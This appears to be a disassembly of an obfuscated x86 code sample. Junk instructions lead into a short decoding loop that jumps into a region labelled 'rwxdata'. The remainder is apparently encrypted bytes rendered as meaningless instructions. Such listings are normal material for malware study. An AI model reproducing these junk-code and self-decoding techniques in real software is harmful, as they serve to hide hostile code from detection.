_start
or edi 0x7c92e4f4
aam 0xa
inc edx
cmp ecx ecx
clc
dec ebx
aam 0xa
and eax 0x7c92e4f4
dec ecx
aad 0xa
dec esi
or edi eax
aad 0xa
and eax edi
add esi ebx
clc
test edi eax
mov ebx edi
mov ecx 0x5a15
mov esi eax
cld
add ecx 0xffffacc9
inc edx
aam 0xa
das
das
cmp eax 0xc181
add edx 0xc181
aam 0xa
inc edx
dec ebx
dec ebx
aad 0xa
cmc
aam 0xa
cld
or esi 0xc181
mov edx 0x2
mov edi 0x44e4
dec eax
sub esi edx
aam 0xa
dec eax
or ebx ebx
daa
xor esi eax
add esi ebx
cmp esi ebx
das
add edi 0x403cb5
xor eax 0xc781
daa
mov edx 0xc781
adc edx esi
mov eax edx
aad 0xa
mov edx 0xc781
dec edx
stc
dec eax
inc ebx
dec edx
sub eax 0x2
stc
mov esi 0x40eb78
das
mov ebx ebx
stc
test ebx ebx
aad 0xa
dec ebx
xor eax 0x1
dec eax
sub edx 0x1
aad 0xa
cld
cmp ebx 0x1
dec edx
or ebx 0x1
add eax 0x1
xor esi 0x6ae1
aad 0xa
das
add edx eax
dec ebx
dec ebx
inc ebx
aad 0xa
adc eax edx
test eax 0xf681
add ebx eax
inc eax
dec ebx
cmp eax ebx
aam 0xa
aad 0xa
and edx eax
and edx ebx
das
aad 0xa
inc edx
daa
aam 0xa
inc eax
sub edx ebx
sub eax ebx
dec ebx
aam 0xa
aam 0xa
mov edx 0x0
and edx ebx
aad 0xa
stc
xor eax 0x0
or eax eax
dec ebx
stc
sub ebx edx
and edx 0x0
das
mov ebx edx
and ebx 0x0
xor ebx 0x0
and ebx edx
aam 0xa
mov edx 0x0
cmp ebx 0x0
add ebx 0x0
aam 0xa
adc eax eax
cld
mov edx edx
sub al 0x31
dec al
add al cl
rol al 0x24
add al cl
not al
add al 0xe2
add al 0xaf
sub al cl
add al cl
sub al 0x5a
lodsb [ esi ]
add al 0xea
clc
add al cl
sub al 0xe
je rwxdata
[ ecx + edi ]
sub al 0x39
push esi
cwde
js rwxdata
aam 0xa
inc eax
inc edx
dec eax
das
aam 0xa
inc ebx
or ebx 0x0
mov edx 0x0
sub [ ebp - 0x45 ] 0xffffffe4
jpe rwxdata
xor al 0x84
add al cl
add al cl
xor al 0x9
nop
add al 0x39
add al 0xd5
add al cl
jmp rwxdata
fisubr [ ebx - 0x73909dc7 ]
test eax 0x77982ba6
jne rwxdata
xor esp [ eax ]
popad
scasb [ edi ]
daa
lodsb [ esi ]
mov cl 0xce
fild [ eax + 0x75 ]
loop rwxdata
js rwxdata
insd
mov ebx 0xdac67ae4
stosd [ edi ]
cmp [ edx + 0x6f ] esp
mov [ ecx + 0x77982ba6 ] gs
mov bh 0x75
and edx ecx
fisubr [ esp + edi * 4 ]
pushfd
mov fs [ ebx - 0x6c ]
mov edx 0xb1dcdf2f
test al 0xc9
push esp
pop ebp
ror [ esp + ecx ] cl
out dx al
xlat
push ecx
sti
add al 0xf9
dec edx
sbb esp [ ecx + 0x76d8fa06 ]
pop ds
fld [ esi ]
sub ch al
mov ah 0x9d
pop ebx
test [ edx + 0x33ca50be ] al
out 0xff al
inc ebx
scasb [ edi ]
sti
daa
fisttp [ ebp + 0x5078eca6 ]
push 0xb8bb241b
jpo rwxdata
mov bh 0x75
stosb [ edi ]
loop rwxdata
pop edx
mov al [ 0x4734770a ]
cmc
push ds
dec eax
loopne rwxdata
jpe rwxdata
enter 0x8c73 0x3b
daa
loop rwxdata
or [ edi + 0x5c4f327e ] dl
out dx al
pop esi
pop esp
pushad
sbb al 0xde
test [ edi + 0x483b2ed4 ] 0xfa9f3aed
int 0xd6
sub edi [ eax + 0x5f3668cd ]
jmp rwxdata
cld
sbb bh 0x71
cmpsd [ esi ] [ edi ]
popad
mov dh [ eax - 0x20db50a4 ]
mov ebx 0xa0f3b1c9
cmp ecx esi
clc
shl [ ebx + 0x7c ] 0x75
push 0xafc8fe3
pop ss
and al 0xb6
cmpsb [ esi ] [ edi ]
pop edi
enter 0xb1dd 0xff
push 0x301ef7e8
dec eax
push ebp
adc al 0x5d
mov edx 0xba1f1eab
loop rwxdata
xor [ eax + 0x55 ] cl
jecxz rwxdata
jg rwxdata
stosd [ edi ]
push ds
pop ds
mov edx 0x5d14c0e2
jle rwxdata
or [ edi - 0x24 ] ecx
test [ esi + ebp * 2 - 0x315fe189 ] ch
std
salc
adc [ ebx ] 0xffffffa0
push 0xe06d4f46
push esi
test al dl
push 0x21087554
dec esi
sub_40201c
pop es
dec eax
test [ ebp - 0x1b8e56cf ] bh
sbb esp [ ebx + ebx * 8 ]
xchg ebp eax
ficom [ edi ]
jbe rwxdata
and ah [ eax - 0x3c ]
test al 0x7
jmp rwxdata
test [ ecx - 0x4c ] esi
jmp 0xffffffffa904803e
